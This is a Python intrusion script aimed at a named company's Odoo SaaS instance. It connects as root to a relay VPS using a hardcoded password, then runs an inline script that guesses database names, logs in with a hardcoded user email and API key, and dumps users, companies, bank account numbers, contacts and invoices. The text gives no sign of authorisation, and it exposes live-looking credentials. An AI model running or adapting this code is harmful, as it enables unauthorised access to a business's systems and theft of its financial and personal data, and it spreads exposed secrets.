"""R2 Capital Technologies MX — Odoo SaaS auth + recon"""
import paramiko, sys

VPS_IP = "82.27.100.115"
VPS_PW = "37W92I_Wd9581g5j1g1LzI"

SCRIPT = r'''python3 -c "
import json, sys, ssl, re
from urllib.request import Request, urlopen, build_opener, HTTPCookieProcessor
from urllib.error import URLError, HTTPError
from urllib.parse import urlencode
from http.cookiejar import CookieJar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE   = 'https://r2-r2capital.odoo.com'
USER   = 'mmarron@madecconsultoria.com'
APIKEY = '9242f55eec6e9ffcb167ca16751f797a204eb604'

def rpc(service, method, args):
    payload = json.dumps({
        'jsonrpc': '2.0', 'id': 1, 'method': 'call',
        'params': {'service': service, 'method': method, 'args': args}
    }).encode()
    req = Request(BASE + '/jsonrpc', data=payload,
                  headers={'Content-Type': 'application/json'})
    resp = urlopen(req, timeout=25, context=ctx)
    return json.loads(resp.read().decode())

def call_kw(model, method, args=None, kwargs=None, session_id=None):
    payload = json.dumps({
        'jsonrpc': '2.0', 'id': 1,
        'params': {
            'model': model, 'method': method,
            'args': args if args is not None else [[]],
            'kwargs': kwargs or {}
        }
    }).encode()
    headers = {'Content-Type': 'application/json'}
    if session_id:
        headers['Cookie'] = f'session_id={session_id}'
    req = Request(BASE + '/web/dataset/call_kw', data=payload, headers=headers)
    resp = urlopen(req, timeout=25, context=ctx)
    return json.loads(resp.read().decode())

print('='*60)
print('R2 CAPITAL TECHNOLOGIES MX — Odoo SaaS')
print(f'Target: {BASE}')
print('='*60)

# 1. Version
print()
print('[1] Odoo version...')
try:
    v = rpc('common', 'version', [])
    ver = v.get('result', {})
    print(f'    Server version: {ver.get(\"server_version\", \"?\")}')
    print(f'    Server serie: {ver.get(\"server_serie\", \"?\")}')
    print(f'    Protocol: {ver.get(\"protocol_version\", \"?\")}')
except Exception as e:
    print(f'    Error: {e}')

# 2. DB discovery
print()
print('[2] Database discovery...')
try:
    r = rpc('db', 'list', [])
    dbs = r.get('result', [])
    print(f'    Databases: {dbs}')
except Exception as e:
    print(f'    db.list blocked: {e}')
    dbs = []

# Try db_exist for common names
if not dbs:
    print('    Trying db_exist...')
    for db in ['r2-r2capital', 'r2capital', 'r2', 'main', 'production', 'prod',
               'r2-r2capital-main', 'r2_capital', 'odoo']:
        try:
            r = rpc('db', 'db_exist', [db])
            exists = r.get('result')
            if exists:
                print(f'    DB \"{db}\" EXISTS!')
                if db not in dbs:
                    dbs.append(db)
        except:
            pass

if not dbs:
    dbs = ['r2-r2capital', 'r2capital', 'r2-r2capital-main-18948498']

# 3. JSON-RPC Auth
print()
print('[3] JSON-RPC authenticate...')
uid = None
working_db = None
for db in dbs:
    try:
        r = rpc('common', 'login', [db, USER, APIKEY])
        result = r.get('result')
        if result and result is not False and result != 0:
            print(f'    >>> HIT! db={db} UID={result} <<<')
            uid = result
            working_db = db
            break
        else:
            print(f'    db={db} -> False')
    except Exception as e:
        print(f'    db={db} -> {e}')

# 4. Web Login
print()
print('[4] Web login...')
jar = CookieJar()
opener = build_opener(HTTPCookieProcessor(jar))

try:
    req = Request(BASE + '/web/login', headers={'User-Agent': 'Mozilla/5.0'})
    resp = opener.open(req, timeout=20)
    html = resp.read().decode(errors='replace')
    
    # Extract CSRF
    m = re.search(r'name=\"csrf_token\"\s+value=\"([^\"]+)\"', html)
    csrf = m.group(1) if m else ''
    
    # Extract DB from page
    m2 = re.search(r'name=\"db\"\s+value=\"([^\"]+)\"', html)
    page_db = m2.group(1) if m2 else ''
    if page_db:
        print(f'    DB from login page: {page_db}')
        if page_db not in dbs:
            dbs.insert(0, page_db)
    
    # Check if login page has useful info
    if 'database' in html.lower():
        m3 = re.findall(r'option[^>]*value=\"([^\"]+)\"', html)
        if m3:
            print(f'    DB options: {m3}')
    
    # Try login
    login_db = page_db or (dbs[0] if dbs else 'r2-r2capital')
    data = urlencode({
        'login': USER, 'password': APIKEY,
        'csrf_token': csrf, 'db': login_db, 'redirect': '/'
    }).encode()
    
    req = Request(BASE + '/web/login', data=data,
                  headers={'Content-Type': 'application/x-www-form-urlencoded',
                           'User-Agent': 'Mozilla/5.0'})
    resp = opener.open(req, timeout=25)
    final_url = resp.geturl()
    body = resp.read().decode(errors='replace')
    
    if '/web' in final_url and 'login' not in final_url:
        print(f'    >>> WEB LOGIN OK! Redirected to {final_url} <<<')
        
        # Get session cookie
        sid = None
        for cookie in jar:
            if cookie.name == 'session_id':
                sid = cookie.value
                print(f'    session_id: {sid[:30]}...')
        
        # Get session info
        payload = json.dumps({'jsonrpc': '2.0', 'id': 2, 'params': {}}).encode()
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        if sid:
            headers['Cookie'] = f'session_id={sid}'
        req = Request(BASE + '/web/session/get_session_info', data=payload, headers=headers)
        resp = opener.open(req, timeout=20)
        info = json.loads(resp.read().decode()).get('result', {})
        
        print(f'    Username: {info.get(\"username\")}')
        print(f'    UID: {info.get(\"uid\")}')
        print(f'    DB: {info.get(\"db\")}')
        print(f'    Company: {info.get(\"company_id\")}')
        print(f'    Is admin: {info.get(\"is_admin\")}')
        print(f'    Is system: {info.get(\"is_system\")}')
        print(f'    Server version: {info.get(\"server_version\")}')
        print(f'    User context: {info.get(\"user_context\")}')
        
        uid = info.get('uid')
        working_db = info.get('db')
        
    elif 'Wrong login' in body or 'incorrecto' in body.lower() or 'Invalid' in body:
        print(f'    Wrong login/password (db={login_db})')
        # Try with page_db via JSON-RPC too
        if page_db and page_db not in [d for d in dbs if d != page_db]:
            try:
                r = rpc('common', 'login', [page_db, USER, APIKEY])
                result = r.get('result')
                if result and result is not False and result != 0:
                    print(f'    >>> JSON-RPC HIT with page_db={page_db} UID={result} <<<')
                    uid = result
                    working_db = page_db
            except:
                pass
    else:
        print(f'    URL: {final_url}')
        # Check for error messages
        if 'error' in body.lower():
            m = re.search(r'class=\"alert[^\"]*\"[^>]*>([^<]+)', body)
            if m:
                print(f'    Alert: {m.group(1).strip()}')
        print(f'    Body[:300]: {body[:300]}')
        
except Exception as e:
    print(f'    Error: {e}')

# 5. If authenticated, enumerate
if uid and working_db:
    print()
    print('='*60)
    print(f'[5] AUTHENTICATED! UID={uid} DB={working_db}')
    print('    Enumerating...')
    print('='*60)
    
    # Use JSON-RPC with uid
    def obj_exec(model, method, args=None, kwargs=None):
        payload = json.dumps({
            'jsonrpc': '2.0', 'id': 1, 'method': 'call',
            'params': {'service': 'object', 'method': 'execute_kw',
                       'args': [working_db, uid, APIKEY, model, method,
                                args if args is not None else [[]],
                                kwargs or {}]}
        }).encode()
        req = Request(BASE + '/jsonrpc', data=payload,
                      headers={'Content-Type': 'application/json'})
        resp = urlopen(req, timeout=25, context=ctx)
        return json.loads(resp.read().decode())
    
    # Current user
    print()
    print('[5a] Current user (res.users)')
    try:
        r = obj_exec('res.users', 'read', [[uid]], {'fields': ['name','login','email','groups_id','company_id','company_ids']})
        user_data = r.get('result', [])
        for u in user_data:
            print(f'    Name: {u.get(\"name\")}')
            print(f'    Login: {u.get(\"login\")}')
            print(f'    Email: {u.get(\"email\")}')
            print(f'    Company: {u.get(\"company_id\")}')
            print(f'    Companies: {u.get(\"company_ids\")}')
            print(f'    Groups: {u.get(\"groups_id\")}')
    except Exception as e:
        print(f'    Error: {e}')
    
    # All users
    print()
    print('[5b] All users (res.users)')
    try:
        r = obj_exec('res.users', 'search_read', [[]], {'fields': ['name','login','email','active'], 'limit': 50})
        users = r.get('result', [])
        print(f'    Total users: {len(users)}')
        for u in users:
            print(f'    [{u.get(\"id\")}] {u.get(\"name\")} | {u.get(\"login\")} | {u.get(\"email\")} | active={u.get(\"active\")}')
    except Exception as e:
        print(f'    Error: {e}')
    
    # Companies
    print()
    print('[5c] Companies (res.company)')
    try:
        r = obj_exec('res.company', 'search_read', [[]], {'fields': ['name','email','phone','vat','currency_id','country_id'], 'limit': 20})
        companies = r.get('result', [])
        for c in companies:
            print(f'    [{c.get(\"id\")}] {c.get(\"name\")} | VAT={c.get(\"vat\")} | {c.get(\"email\")} | {c.get(\"phone\")}')
    except Exception as e:
        print(f'    Error: {e}')
    
    # Installed modules
    print()
    print('[5d] Installed modules')
    try:
        r = obj_exec('ir.module.module', 'search_read',
                      [[['state','=','installed']]],
                      {'fields': ['name','shortdesc'], 'limit': 100})
        mods = r.get('result', [])
        print(f'    Installed: {len(mods)}')
        for m in mods[:30]:
            print(f'    - {m.get(\"name\")}: {m.get(\"shortdesc\")}')
        if len(mods) > 30:
            print(f'    ... +{len(mods)-30} more')
    except Exception as e:
        print(f'    Error: {e}')
    
    # Bank accounts / accounting
    print()
    print('[5e] Bank accounts (res.partner.bank)')
    try:
        r = obj_exec('res.partner.bank', 'search_read', [[]], 
                      {'fields': ['acc_number','bank_id','partner_id','company_id'], 'limit': 50})
        banks = r.get('result', [])
        print(f'    Total bank accounts: {len(banks)}')
        for b in banks:
            print(f'    [{b.get(\"id\")}] {b.get(\"acc_number\")} | bank={b.get(\"bank_id\")} | partner={b.get(\"partner_id\")} | company={b.get(\"company_id\")}')
    except Exception as e:
        print(f'    Error: {e}')
    
    # Contacts/Partners
    print()
    print('[5f] Partners/Contacts (top 20)')
    try:
        r = obj_exec('res.partner', 'search_read', [[]],
                      {'fields': ['name','email','phone','vat','company_type','is_company'], 'limit': 20})
        partners = r.get('result', [])
        print(f'    Total shown: {len(partners)}')
        for p in partners:
            print(f'    [{p.get(\"id\")}] {p.get(\"name\")} | {p.get(\"email\")} | {p.get(\"phone\")} | VAT={p.get(\"vat\")} | company={p.get(\"is_company\")}')
    except Exception as e:
        print(f'    Error: {e}')

    # Invoices
    print()
    print('[5g] Invoices (account.move, top 10)')
    try:
        r = obj_exec('account.move', 'search_read', [[['move_type','in',['out_invoice','in_invoice']]]],
                      {'fields': ['name','partner_id','amount_total','state','invoice_date','currency_id'], 'limit': 10, 'order': 'id desc'})
        invoices = r.get('result', [])
        print(f'    Invoices found: {len(invoices)}')
        for inv in invoices:
            print(f'    [{inv.get(\"id\")}] {inv.get(\"name\")} | {inv.get(\"partner_id\")} | ${inv.get(\"amount_total\")} | {inv.get(\"state\")} | {inv.get(\"invoice_date\")}')
    except Exception as e:
        print(f'    Error: {e}')

else:
    print()
    print('[!] Auth failed. Trying alternate approaches...')
    
    # Check what the login page looks like
    print()
    print('[ALT] Login page info:')
    try:
        req = Request(BASE + '/web/login', headers={'User-Agent': 'Mozilla/5.0'})
        resp = urlopen(req, timeout=15, context=ctx)
        html = resp.read().decode(errors='replace')
        # Find DB field
        dbs_found = re.findall(r'value=\"([^\"]+)\"[^>]*name=\"db\"', html)
        dbs_found2 = re.findall(r'name=\"db\"[^>]*value=\"([^\"]+)\"', html)
        print(f'    DB fields: {dbs_found + dbs_found2}')
        # Find all hidden inputs
        hiddens = re.findall(r'<input[^>]*type=\"hidden\"[^>]*name=\"([^\"]+)\"[^>]*value=\"([^\"]{0,60})\"', html)
        for name, val in hiddens:
            if name != 'csrf_token':
                print(f'    Hidden: {name} = {val}')
    except Exception as e:
        print(f'    Error: {e}')

print()
print('Done')
"
'''

print(f"[*] Connecting to VPS {VPS_IP}...")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(VPS_IP, username="root", password=VPS_PW, timeout=10,
               look_for_keys=False, allow_agent=False)
print(f"[+] Connected!")

stdin, stdout, stderr = client.exec_command(SCRIPT, timeout=180)
out = stdout.read().decode(errors="replace")
err = stderr.read().decode(errors="replace")

print(out)
if err and "InsecureRequestWarning" not in err:
    print(f"STDERR: {err[:1500]}")

client.close()
